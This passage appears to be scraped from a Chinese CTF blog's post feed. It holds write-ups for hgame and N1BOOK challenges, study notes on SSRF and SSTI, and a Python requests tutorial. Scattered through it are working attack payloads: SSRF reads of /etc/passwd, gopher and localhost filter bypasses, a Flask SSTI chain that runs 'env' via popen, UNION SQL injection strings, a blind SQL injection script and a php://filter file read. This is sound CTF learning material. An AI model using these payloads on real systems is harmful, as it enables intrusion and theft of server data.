要注意，由于有部分位是非字母字符，因此那些位的key无法计算，所以我们跑出来的flag也不是最终flag： 不过这个flag还是比较好猜的，“你知道‘明文攻击’吗？”，因此得出flag： 1hgame&#123;D0_y0u_kn0w_&#x27;Kn0wn-pla1ntext_attack&#x27;?&#125; IoT第一周IoT就一题，还是纯送分。直接把文件拖入IDA就能找到flag了： MISC欢迎欢迎！热烈欢迎！签到题。 这个压缩包有点麻烦附件给了一个压缩包，首先提示我们6位密码，因此直接爆破： 接着给了第二个压缩包，一个提示和一个字典，根据提示这里是字典爆破： 接着给了第三个压缩包和一个文件，比较发现这个文件和第三个压缩包中的文件一致，因此是明文破解： 接着打开是一张图片，binwalk发现藏有压缩包，因此进行分离： 这个压缩包中只有一张加密的图片，因此猜测伪加密，更改hex，成功获取flag图片： 好康的流量打开流量包直接追踪TCP流，发现base64表示的图片： 通过base64获取图片，可以利用这个网站：base64转图片 接着把图扔进stegslove中，在其中一个通道发现条形码，扫描条形码获取一半flag： 在流量包中解base64码可以得到LSB的提示，也可以直接猜，另一半flag就藏在LSB中： 组合成flag： 1hgame&#123;ez_1mg_Steg4n0graphy&#125; 群青(其实是幽灵东京）下载附件是一段音频，幽灵东京是真的好听，查看属性发现提示： 把音频放在SilentEye中解密但是没有解出来，猜测需要密码，查看音频的波形图找到密码并成功解密： 进入链接下载第二个附件，名字叫sstv，百度搜索一下发现是慢扫描电视，在手机上下载robot36，打开软件播放音频得到图片，扫描二维码即可得到flag： PWNtest_your_nc出题人煞费苦心就为了送我们这1分，太感动了，直接监听就行了： REVERSEeasyasm听队友说这题和安卓逆向都很简单，我就去做了。这题要我们生啃汇编搞懂逻辑，先看代码： 审计代码，逻辑就是将我们输入的字符左移4位的值与右移四位的值相加，再与0x17做一次异或，并将这个字符与上面那张图的十六进制比较，每一位都相等就输出right。根据逻辑编写脚本计算flag： 1234567list=[0x91,0x61,0x1,0xc1,0x41,0xa0,0x60,0x41,0xd1,0x21,0x14,0xc1,0x41,0xe2,0x50,0xe1,0xe2,0x54,0x20,0xc1,0xe2,0x60,0x14,0x30,0xd1,0x51,0xc0,0x17]flag = &#x27;&#x27;for i in list: xor = i^0x17 flag += chr((xor&gt;&gt;4) + ((xor&amp;0x0f)&lt;&lt;4))print(flag) creakme把文件拖入IDA审计代码： 分析逻辑，就是将输入的明文每次取8位，前4位为v2，后4位为v3，并进行如图所示的32次循环加密，生成密文。不过由于循环了32次，所以我们再次循环32次就相当于解密回去了。编写脚本： 123456789101112131415161718192021222324252627282930313233import binasciiv0: int = 0f1=&#x27;65E0F2E3CF9284AABA5A126DAE1FEDE6ED9CE5ED52EB78C2030C144C48D93488&#x27;t2=0w1=0flag=b&#x27;&#x27;v7 = int(b&#x27;DCBA&#x27;.hex(), 16)v8 = int(b&#x27;HGFE&#x27;.hex(), 16)v9 = int(b&#x27;LKJI&#x27;.hex(), 16)v10 = int(b&#x27;PONM&#x27;.hex(), 16)while w1&lt;4: v3 =int(f1[t2:t2+8], 16) v2 =int(f1[t2+8:t2 + 16], 16) t2+=16 w1+=1 v4 = 32 # print(f&#x27;&#123;v2:x&#125;,&#123;v3:x&#125;&#x27;) while v4 &gt; 0: v0 = (v4 * 305419896) &amp; 0x00000000ffffffff v3 -= v0 ^ (v0 + v2) ^ (v7 + ((v2 &lt;&lt; 4) &amp; 0x00000000ffffffff)) ^ (v8 + ((v2 &amp; 0x00000000ffffffe0) &gt;&gt; 5)) v3 = v3 &amp; 0x00000000ffffffff v2 -= v0 ^ (v0 + v3) ^ (v9 + ((v3 &lt;&lt; 4) &amp; 0x00000000ffffffff)) ^ (v10 + ((v3 &amp; 0x00000000ffffffe0) &gt;&gt; 5)) v2 = v2 &amp; 0x00000000ffffffff v4 -= 1 if v3 != 0: flag+= binascii.a2b_hex(hex(v3)[2:10]) if v2 != 0: flag += binascii.a2b_hex(hex(v2)[2:10])print(flag[::-1])# flag=bytes(v2) Flag Checker把apk扔进jeb里反编译，分析java代码： 加密逻辑看起来很复杂，其实简单说就是以v0为密钥对v4进行RC4加密，比较结果是否与密文相等，而v4的值就是flag，因此直接解密RC4就可以了： WEBeasy_auth这题挺神奇的，名字叫弱口令，结果和弱口令一点关系都没有。这题的实质是伪造jwt，关于jwt我之前介绍token的博客也写过了。先注册一个账号登录，登录时抓包发现token： 伪造的时候发现没有secret，因此密钥为空，所以我们只需要伪造中间那一部分就行了，id改为1，名称改为admin： 最后在本地储存中更改token，刷新页面拿到flag： 蛛蛛…嘿嘿♥我的蛛蛛不会写脚本，很麻，手点到100关的，等wp出了研究下。 Tetris plus游戏关10%改分，90%藏js里，这题很显然藏在js里。检查js，发现可疑目标： 翻阅发现jsfuck，解码得到flag： Fujiwara Tofu Shop经典的更改请求头的题目，考察http协议，这里就直接放最后的头文件了。要注意最后进行伪造本地请求时，不要用xff，否则你会得到出题人爱的关怀：","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"ssrf的学习","slug":"ssrf的学习","date":"2022-01-25T03:20:12.000Z","updated":"2022-01-26T11:31:57.039Z","comments":true,"path":"2022/01/25/ssrf的学习/","link":"","permalink":"http://example.com/2022/01/25/ssrf%E7%9A%84%E5%AD%A6%E4%B9%A0/","excerpt":"前言做题的时候碰到了挺多的ssrf类型的题目，这里做一个学习总结。","text":"前言做题的时候碰到了挺多的ssrf类型的题目，这里做一个学习总结。 什么是ssrfSSRF（Server-Side Request Forgery:服务器端请求伪造）是一种由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。进行SSRF的目的一般都是通过服务端来攻击黑客无法直接访问的内网系统。大致流程如下图所示： 服务器A为web服务器，可以被攻击者访问，而主机B作为内网中其他服务器无法被访问。如果此时服务器A中的web服务存在ssrf漏洞，那么我们就可以通过服务器A发送请求头进行欺骗，达到获取主机B内容的目的。 漏洞产生原因 file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。 readfile()：输出一个文件的内容。 fsockopen()：打开一个网络连接或者一个Unix 套接字连接。 curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。 fopen()：打开一个文件文件或者 URL。 ……上述函数的不当使用以及PHP原生类SoapClient在触发反序列化时都可导致SSRF。 漏洞危害 对外网、服务器所在内网、服务器本地进行端口扫描，获取一些服务的banner信息等。 攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等。 对内网Web应用进行指纹识别，识别企业内部的资产信息。 攻击内外网的Web应用，主要是使用HTTP GET/POST请求就可以实现的攻击，如sql注入、文件上传等。 利用file协议读取服务器本地文件等。 进行跳板攻击等。 ssrf挖掘 web功能 社交分享功能：获取超链接的标题等内容进行显示 转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览 在线翻译：给网址翻译对应网页的内容 图片加载/下载：例如富文本编辑器中的点击下载图片到本地、通过URL地址加载或下载图片 图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验 云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行 URL关键字share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain等 利用方式SSRF的利用主要就是读取内网文件、探测内网主机存活、扫描内网端口、攻击内网其他应用等，而这些利用的手法无一不与协议息息相关。 SSRF常用到的协议有： file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容 dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等 http(s)协议：探测内网主机存活 gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell file协议构造如下payload，实现读取服务器上的本地文件及网站源码： 12?url=file:///etc/passwd?url=file:///var/www/html/index.php dict协议我们可以利用dict协议构造payload查看内网主机上开放的端口及端口上运行服务的版本信息等，例如redis、http、ssh等： 1?url=http://192.168.255.255:80/info 出现什么的报错就说明该主机上有什么服务。 http(s)协议先读取读取/etc/hosts、/proc/net/arp、/proc/net/fib_trie等文件获得目标主机的网络配置信息，以获得目标主机内网网段并进行爆破。内网段IP分为三类： A类：10.0.0.0 - 10.255.255.255 B类：172.16.0.0 - 172.31.255.255 C类：192.168.0.0 - 192.168.255.255 使用bp爆破或构建payload通过服务器发送请求检测内网存活主机： 1?url=http://192.168.255.255 Gopher协议Gopher协议支持发出GET、POST请求，是SSRF中最重要的利用协议之一。我们可以截获请求包，再修改构建成符合Gopher协议格式的payload，攻击面十分之广。payload如下： 1234?url=gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_TCP流//gopher的默认端口是70//如果发起POST请求，回车换行需要使用%0d%0a来代替%0a，如果多个参数，参数之间的&amp;也需要进行URL编码 想要构造合法payload，可以利用下面的脚本进行改写： 12345678import urllib.parsepayload =\\&quot;&quot;&quot;head payload&quot;&quot;&quot; tmp = urllib.parse.quote(payload)new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)result = &#x27;gopher://url/&#x27;+&#x27;_&#x27;+newprint(result) 要注意： 问号需要转码为URL编码，也就是%3f 回车换行要变为%0d%0a,但如果直接用工具转 在HTTP包的最后要加%0d%0a，代表消息结束 bypass 基本身份认证绕过如果目标代码限制访问的域名只能为http://www.hack.com，那么我们可以采用HTTP基本身份认证的方式绕过。即@：http://www.xxx.com@www.mrl64.com 302跳转如果要求从本地访问，我们可以使用xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名。例如，当我们访问http://127.0.0.1.xip.io/flag.php时，实际访问的是http://127.0.0.1/1.php。这样的网址还有http://nip.io和http://sslip.io。 或者使用短地址，https://4m.cn/对应的短地址即为本地，例如 https://4m.cn/FjOdQ就会自动302跳转到http://127.0.0.1/flag.php上。 进制绕过利用ip地址的进制变化，绕过，这里提供一个在线工具与脚本：IP地址进制转化 脚本： 1234567891011121314&lt;?php$ip = &#x27;127.0.0.1&#x27;;$ip = explode(&#x27;.&#x27;,$ip);$r = ($ip[0] &lt;&lt; 24) | ($ip[1] &lt;&lt; 16) | ($ip[2] &lt;&lt; 8) | $ip[3] ;if($r &lt; 0) &#123;$r += 4294967296;&#125;echo &quot;int:&quot;; // 2130706433echo $r;echo &quot;oct:&quot;; // 0177.0.0.1echo decoct($r);echo &quot;hex:&quot;; // 0x7f.0.0.1echo dechex($r);?&gt; 还有其他指向本地的地址： 12345678http://localhost/ http://0/ //0在window下代表0.0.0.0，而在liunx下代表127.0.0.1http://[0:0:0:0:0:ffff:127.0.0.1]/ //在liunx下可用http://[::]:80/ //在liunx下可用http://127。0。0。1/ http://①②⑦.⓪.⓪.①http://127.1/http://127.00000.00000.001/ 目录穿越PHP的file_get_contents()在遇到不认识的协议头时候会将这个协议头当做文件夹，造成目录穿越漏洞，这个方法可以在SSRF的众多协议被禁止且只能使用它规定的某些协议的情况下来进行读取文件。 例如： 1?url=httpssss://../../../../etc/passwd url解析(1)readfile和parse_url函数的解析差异如果后端用parse_url限制我们传递url的端口，例如限定了80，而我们想要读取9999端口中的内容，我们可以这样构建payload：1?url=http://127.0.0.1:9999:80/ 这是因为readfile()获取的端口是最后冒号前面的一部分，而parse_url()获取的则是最后冒号后面的的端口，利用这种差异的不同，从而绕过WAF。 同样这两个函数对host的解析也是不同的，readfile()获取的是@号后面一部分，而parse_url()获取的则是@号前面的一部分，利用这种差异的不同，我们可以绕过题目中parse_url()函数对指定host的限制。 (2)curl和parse_url的解析差异这两个函数主要针对host解析上的差异，curl()解析的是第一个@后面的网址，而parse_url()解析的是第二个@后面的网址。利用这个原理我们可以绕过题目中parse_url()对指定host的限制。 1?url=http://foo@hack.com:80@mrl64.com 总结SSRF也是web中的一个经典考点了，通过SSRF可以对内网的Redis、FastCGI、Mysql等发起攻击。之后遇到新的题型会继续补充。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -ssrf","slug":"web-ssrf","permalink":"http://example.com/tags/web-ssrf/"}]},{"title":"ssti模板注入","slug":"ssti模板注入","date":"2022-01-20T04:41:44.000Z","updated":"2022-01-20T10:58:36.345Z","comments":true,"path":"2022/01/20/ssti模板注入/","link":"","permalink":"http://example.com/2022/01/20/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/","excerpt":"前言啊哈哈哈哈，ssti，不玩阴的，直接来吧。","text":"前言啊哈哈哈哈，ssti，不玩阴的，直接来吧。 什么是模板模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。 什么是ssti（模板注入）当前使用的一些框架已经形成了非常成熟的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句。凡是存在使用模板的地方都有可能存在ssti。 常见模板引擎汇总及tagphp Smarty：&#123;php&#125;payload;&#123;/php&#125;、&#123;payload&#125;、&#123;if payload&#125;&#123;/if&#125; Twig：&#123;&#123;payload&#125;&#125; Blade:详见Blade模板引擎 Java FreeMarker：$&#123;payload&#125;、&lt;#payload&gt; velocity:#set($x=payload)$&#123;x&#125; Python Flask/Jinja2:&#123;&#123;payload&#125;&#125; Tornado:&#123;&#123;payload&#125;&#125;、&#123;% import os %&#125;&#123;&#123; os.popen(\"whoami\").read() &#125;&#125; Django:&#123;&#123;payload&#125;&#125;、&#123;%payload%&#125; 攻击思路我们进行ssti，目的一般都是为了创建对象、文件读写、远程文件包含、信息泄漏、提权等等。为了达成目的，我们必须找到适当的注入点进行攻击。首先寻找模板本身支持的语法、内置的变量、属性、函数等等，接着是框架的全局变量、函数、属性等，再然后我们考虑语言本身的特性，最后以上都不行的情况下再考虑应用本身存在的变量。 [护网杯 2018]easy_tornado这题的难点不在ssti上。首先进入题目三个文件，第一个告诉我们flag的文件名称，第二个提示我们render，第三个给我们一串加密逻辑: 1md5(cookie_secret+md5(filename)) 我们观察url不难发现这个加密逻辑应该是filehash的逻辑，而我们只要将/fllllllllllllag对应的filehash算出来就可以了。但是这里有一个cookie_secret，结合提示render，render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页render配合Tornado使用，我们猜测这里有一个ssti。随意更改url进入error界面，我们发现url中有msg参数，进行模板测试： 存在ssti，我们将msg改为获取cookie_secret： 最后编写脚本获取filehash： 123456789101112import hashlibhash = hashlib.md5()filename=&#x27;/fllllllllllllag&#x27;cookie_secret=&quot;6cd6901e-7485-435e-a8f7-aef19adf1227&quot;hash.update(filename.encode(&#x27;utf-8&#x27;))s1=hash.hexdigest()hash = hashlib.md5()hash.update((cookie_secret+s1).encode(&#x27;utf-8&#x27;))print(hash.hexdigest())//582be1f6041bc39f2fdbed73bf1196fe 最后构建url获取flag： [Flask]SSTI通过查询源码发现存在ssti： 12345678&lt;html&gt; &lt;head&gt; &lt;title&gt;&#123;&#123;title&#125;&#125;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello, &#123;&#123;name&#125;&#125; !&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt; GET一个name参数测试，发现确实存在ssti： 根据题目判断这提示flask ssti，那么先获取子类名： 1?name=&#123;&#123;[].__class__.__bases__[0].__subclasses__()&#125;&#125; 接着查看源码获取子类，我们需要找的大概是以下三类：一是file模块中的read功能，用来读取各种文件，敏感信息等。二是warnings.catch_warnings(需自己导入os模块)、socket._socketobject(需自己导入os模块)、site._Printer、site.Quitter等模块的内置os，通过os模块我们可以做到system执行命令（system执行成功返回0，不会在页面显示。）、popen管道读取文件、listdir列目录等操作。三是get_flashed_messages() 获取闪现信息 写脚本来获取子类： 12345678910111213141516def find(): list = &quot;&quot; list = list.replace(&#x27;\\&#x27;&#x27;,&#x27;&#x27;) list = list.replace(&#x27;&lt;&#x27;,&#x27;&#x27;) list = list.replace(&#x27;&gt;&#x27;,&#x27;&#x27;) list = list.replace(&#x27;class &#x27;,&#x27;&#x27;) list = list.replace(&#x27;enum &#x27;,&#x27;&#x27;) list = list.replace(&#x27;type &#x27;,&#x27;&#x27;) list = list.replace(&#x27; &#x27;,&#x27;&#x27;) list = list.split(&#x27;,&#x27;) print(list) className = &#x27;warnings.catch_warnings&#x27; #需要查找的模块名称 num = list.index(className) print(num) #返回索引if __name__ == &#x27;__main__&#x27;: find() 找到位置为166，接着查询全局变量： 1?name=&#123;&#123;[].__class__.__bases__[0].__subclasses__()[166].__init__.__globals__&#125;&#125; 发现OSError，说明可以自己导入os模块，本来以为是cat /flag，查了wp才发现是在环境变量中： 1&#123;&#123;[].__class__.__bases__[0].__subclasses__()[166].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&quot;)&#125;&#125;","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -ssti","slug":"web-ssti","permalink":"http://example.com/tags/web-ssti/"}]},{"title":"【N1BOOK第一章】web基础练习","slug":"【N1BOOK第一章】web基础练习","date":"2022-01-18T06:23:53.000Z","updated":"2022-01-18T09:37:25.086Z","comments":true,"path":"2022/01/18/【N1BOOK第一章】web基础练习/","link":"","permalink":"http://example.com/2022/01/18/%E3%80%90N1BOOK%E7%AC%AC%E4%B8%80%E7%AB%A0%E3%80%91web%E5%9F%BA%E7%A1%80%E7%BB%83%E4%B9%A0/","excerpt":"前言做buu时发现还有这个模块，感觉挺不错的，做了也就记录下。","text":"前言做buu时发现还有这个模块，感觉挺不错的，做了也就记录下。 常见的搜集直接上dirsearch或者御剑跑，跑出3个200通道，分别是robots.txt，index.php~以及.index.php.swp，分别访问这三个通道： 组合flag：n1book{info_1s_v3ry_imp0rtant_hack} 当vim出现异常会产生.swp文件，可以通过vim -r .index.php.swp恢复文件 粗心的小李提示git泄露，那就直接上githack跑出来就可以了： flag：n1book{git_looks_s0_easyfun} SQL注入-1最简单的sql题，写下联合注入的payload吧： 1234567891011id=-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata--+//information_schema,mysql,note,performance_schemaid=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;note&#x27;--+//fl4g,notesid=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;note&#x27; and table_name=&#x27;fl4g&#x27;--+//fllllagid=-1&#x27; union select 1,2,group_concat(fllllag) from fl4g--+//n1book&#123;union_select_is_so_cool&#125; SQL注入-2POST注入，而且过滤了select，不过经过测试发现是替换为空，因此双写绕过即可。 这题我们使用布尔盲注解题，不过为了确定布尔为true与false之间的html，我们使用bp抓包： 根据抓包结果写脚本： 12345678910111213141516171819202122232425262728293031323334# coding=utf-8import requestsimport timeurl = &quot;http://514f1d32-3229-4fc7-8c85-3f6b2a7352c3.node4.buuoj.cn:81/login.php&quot;data = &#123;&quot;name&quot;: &quot;&quot;,&quot;pass&quot;:&quot;123&quot;&#125;flag= &quot;&quot;for i in range(1, 500): time.sleep(0.06) low = 32 high = 128 mid = (low + high)&gt;&gt;1 while (low &lt; high): # 库名 data[&quot;name&quot;] = &quot;admin&#x27; and (ascii(substr((seselectlect group_concat(schema_name) from information_schema.schemata),%d,1))&gt;%d)#&quot; % (i, mid) # 表名 #data[&quot;name&quot;] = &quot;admin&#x27; and (ascii(substr((seselectlect group_concat(table_name) from information_schema.tables where table_schema=0x6e6f7465),%d,1))&gt;%d)#&quot; % (i, mid) # 字段名 #data[&quot;name&quot;] = &quot;admin&#x27; and (ascii(substr((seselectlect group_concat(column_name) from information_schema.columns where table_schema=0x6e6f7465 and table_name=0x666c3467),%d,1))&gt;%d)#&quot; % (i, mid) # 内容 #data[&quot;name&quot;] = &quot;admin&#x27; and (ascii(substr((seselectlect group_concat(flag) from fl4g),%d,1))&gt;%d)#&quot; % (i, mid) r = requests.post(url, data=data) time.sleep(0.05) if &quot;u8bef&quot; in r.text: low = mid + 1 else: high = mid mid = (low + high) &gt;&gt;1 if (mid == 32 or mid == 127): break flag += chr(mid) print(flag)print(flag) 最后flag：n1book{login_sqli_is_nice} afr_1最简单的任意文件读取漏洞了，直接GET一个php://filter伪协议就可以了： 1?p=php://filter/convert.base64-encode/resource=flag 拿到base64解码就是flag了 12345PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9&lt;?phpdie(&#x27;no no no&#x27;);//n1book&#123;afr_1_solved&#125; afr_2这题考点是Nginx配置不当导致的穿越漏洞，目录穿越也是ctf的常规考点之一了。查看这题的源码，发现/img目录，直接访问并构建payload： 1http://b829a5e0-7041-4a53-a32c-79be1f61a198.node4.buuoj.cn/img../ 找到flag文件，下载查看即可：flag：n1book{afr_2_solved} afr_3首先吐槽，这个afr的flag根据前面的flag都可以直接社工出来。 这题需要ssti的知识，学完再补","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web","slug":"web","permalink":"http://example.com/tags/web/"}]},{"title":"python库的学习","slug":"python库的学习","date":"2022-01-14T06:13:55.000Z","updated":"2022-01-16T06:31:10.296Z","comments":true,"path":"2022/01/14/python库的学习/","link":"","permalink":"http://example.com/2022/01/14/python%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/","excerpt":"前言python，最好的脚本语言，学就完了。","text":"前言python，最好的脚本语言，学就完了。 Requests库之前写盲注脚本的时候就用过Requests库了，许多web题也都需要用上这个库。Requests支持cookie、文件上传、自动确定相应内容编码、自动编码等等，因此十分好用。 发送请求最简单最常用的方法，http协议中有多种请求方法，我们都可以用requests库中的函数来发送对应请求： 1234r = requests.get(&#x27;https://www.baidu.com&#x27;) #发送GET请求r = requests.post(&#x27;https://www.baidu.com&#x27;,data = &#123;&#x27;username&#x27;:&#x27;mrl64&#x27;,&#x27;password&#x27;:&#x27;123hahaha&#x27;&#125;) #发送POST请求r = requests.head(&#x27;https://www.baidu.com&#x27;) #发送HEAD请求…… 获取请求头/响应头这里用GET举例，感觉直接用bp更快就是了，不过python可以获取指定单一请求头，有时候还是会用到的，POST请求同理。 获取请求头： 123456789import requestsurl = &#x27;https://www.baidu.com&#x27;r = requests.get(url)flag = r.request.headersprint(flag)&#123;&#x27;User-Agent&#x27;: &#x27;python-requests/2.26.0&#x27;, &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;, &#x27;Accept&#x27;: &#x27;*/*&#x27;, &#x27;Connection&#x27;: &#x27;keep-alive&#x27;&#125; 获取请求头某一属性： 123456789import requestsurl = &#x27;https://www.baidu.com&#x27;r = requests.get(url)flag = r.request.headers[&#x27;User-Agent&#x27;] #不区分大小写print(flag)python-requests/2.26.0 获取响应头： 123456789import requestsurl = &#x27;https://www.baidu.com&#x27;r = requests.get(url)flag = r.headersprint(flag)&#123;&#x27;Cache-Control&#x27;: &#x27;private, no-cache, no-store, proxy-revalidate, no-transform&#x27;, &#x27;Connection&#x27;: &#x27;keep-alive&#x27;, &#x27;Content-Encoding&#x27;: &#x27;gzip&#x27;, &#x27;Content-Type&#x27;: &#x27;text/html&#x27;, &#x27;Date&#x27;: &#x27;Sat, 15 Jan 2022 11:50:24 GMT&#x27;, &#x27;Last-Modified&#x27;: &#x27;Mon, 23 Jan 2017 13:24:46 GMT&#x27;, &#x27;Pragma&#x27;: &#x27;no-cache&#x27;, &#x27;Server&#x27;: &#x27;bfe/1.0.8.18&#x27;, &#x27;Set-Cookie&#x27;: &#x27;BDORZ=27315; max-age=86400; domain=.baidu.com; path=/&#x27;, &#x27;Transfer-Encoding&#x27;: &#x27;chunked&#x27;&#125; 获取响应头某一属性： 123456789import requestsurl = &#x27;https://www.baidu.com&#x27;r = requests.get(url)flag = r.headers[&#x27;Date&#x27;] #不区分大小写print(flag)Sat, 15 Jan 2022 11:51:41 GMT 获取内容本质上和上面那部分大差不差，直接获取html，Requests会自动解码来自服务器的内容，大多数unicode字符集都能被正确编码： 12345678910import requestsurl = &#x27;https://www.baidu.com&#x27;r = requests.get(url)flag = r.textprint(flag)&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt; &lt;head&gt;&lt;meta http-equiv=content-type…… 我们也可以通过encoding属性来查看编码： 123456789import requestsurl = &#x27;https://www.baidu.com&#x27;r = requests.get(url)flag = r.encodingprint(flag)ISO-8859-1 获取字节对象无论响应是文本还是二进制内容，我们都可以用content属性获得bytes对象，Requests 会自动为你解码 gzip 和 deflate 传输编码的响应数据。 123456789import requestsurl = &#x27;https://www.baidu.com&#x27;r = requests.get(url)flag = r.contentprint(flag)b&#x27;&lt;!DOCTYPE html&gt;\\r\\n&lt;!--STATUS OK--&gt;&lt;html&gt; &lt;head&gt;&lt;meta http-equiv=content-type…… 传递参数使用dict类型变量传递参数，这也是在写脚本时非常常用的一个方法。如果要传递GET请求的参数，我们使用params进行传递： 12345678910import requestsurl = &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/&quot;param = &#123;&quot;id&quot;: &quot;1&quot;&#125;r = requests.get(url, params=param)flag = r.urlprint(flag)http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1 当然，我们更常用到的是POST请求发送参数或者对请求头进行注入等等，这时候我们应该使用data headers cookie等等进行参数传递： 123456789101112import requestsurl = &quot;https://www.baidu.com&quot;head = &#123; &quot;X-Forwarded-For&quot;: &quot;127.0.0.1&quot;&#125;r = requests.get(url, headers=head)flag = r.request.headers[&#x27;X-Forwarded-For&#x27;]print(flag)127.0.0.1 传递cookie参数也可以通过这种方式。 传递json参数这点单拎出来讲，因为一般我们post参数，都是直接post，没管post的数据的类型，此时其默认类型为application/x-www-form-urlencoded。但是如果我们需要传递json格式的数据时就需要进行数据类型指定，当然json是可以直接使用json参数传递的。 12345678910111213141516import requestsimport jsonurl=&quot;https://www.baidu.com&quot;data=&#123;&#x27;a&#x27;=123&#125;head = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;;r = requests.post(url=, headers=head, data=json.dumps(data))或者import requests data = &#123; &#x27;a&#x27;: 123&#125;response = requests.post(url=&#x27;url&#x27;, json=data) Session保持请求写dvwa盲注时就用到了session，Session()能在多次请求中保持一些参数，最常用的一般是拿来保持cookie。同样会话对象可以通过GET或POST方法发送请求，我们以POST方法为例： 123456789import.requestss = request.Session()url = &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/&quot;head = &#123;&#x27;Cookie&#x27;:&#x27;security=low;PHPSESSID=c2fad3pjoio31n2i15243jrb2n&#x27;&#125;data = &#123;&#x27;id&#x27;:&#x27;1&#x27;&#125;r = s.post(url,data=data,headers=head) 任何你传递给请求方法的字典都会与已设置会话层数据合并。方法层的参数覆盖会话的参数。 不过需要注意，就算使用了会话，方法级别的参数也不会被跨请求保持，如下面这个例子，只有第一个请求发送了cookie： 123456789s = requests.Session()r = s.get(&#x27;http://httpbin.org/cookies&#x27;, cookies=&#123;&#x27;from-my&#x27;: &#x27;browser&#x27;&#125;)print(r.text)# &#x27;&#123;&quot;cookies&quot;: &#123;&quot;from-my&quot;: &quot;browser&quot;&#125;&#125;&#x27;r = s.get(&#x27;http://httpbin.org/cookies&#x27;)print(r.text)# &#x27;&#123;&quot;cookies&quot;: &#123;&#125;&#125;&#x27; base64库base64加解密base64.bxxencode接受一个字节数组bytes用于加密，返回一个bytes存储加密之后的内容。例如： 12s = &quot;mrl64&quot;t = base64.b64encode(s.encode(&#x27;UTF-8&#x27;)) base64.bxxdecode接受一个存放着密文的bytes，返回一个bytes存放着解密后的内容。例如： 12s = &#x27;bXJsNjQ=&#x27;t = base64.b64decode(s) 同时支持base64、base32、base16加解密。 url编码由于标准的Base64编码后可能出现字符+和/，在URL中就不能直接作为参数，所以又有一种”url safe”的base64编码，其实就是把字符+和/分别变成-和_。 12345678910111213import base64 s = &#x27;mrl64&#x27; t = base64.urlsafe_b64encode(s.encode(&#x27;UTF-8&#x27;)) print(t) t = base64.urlsafe_b64decode(t) print(t)b&#x27;bXJsNjQ=&#x27;b&#x27;mrl64&#x27; 具体可以参考下面这篇博客：Python标准库base64用法简介 Pillow这个库相当于是PIL的plus版，支持Python3.x，同时兼容原来PIL的功能。这个库主要用来处理图像。 Pillow库安装成功后，导包时要用PIL来导入，而不能用pillow或Pillow。 12import PILfrom PIL import Image 由于是misc方面的内容，而且我也就稍微学了下，就不多叙述了。具体的参考下面这篇博客：Python Pillow(PIL)库的用法介绍 这里留一个二进制转化二维码脚本： 1234567891011121314import PIL from ImageMAX = 25#定义二维码的长款pic = Image.new(&quot;RGB&quot;,(MAX, MAX))#创建一个图片str = &quot;&quot;i=0for y in range (0,MAX): for x in range (0,MAX): if(str[i] == &#x27;1&#x27;): pic.putpixel([x,y],(0, 0, 0)) #填充像素[坐标],(r,g,b)元组值 else: pic.putpixel([x,y],(255,255,255)) i = i+1pic.show() #显示图像pic.save(&quot;flag.png&quot;) #保存图像 如果给的数据不是二进制字符串而是rgb的值，可以将for循环中的内容稍作改变: 123456for i in range(0, x): for j in range(0, y): line = file.readline() #获取一行的rgb值 rgb = line.split(&quot;, &quot;) #分离rgb，文本中逗号后面有空格 im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2]))) #将rgb转化为像素 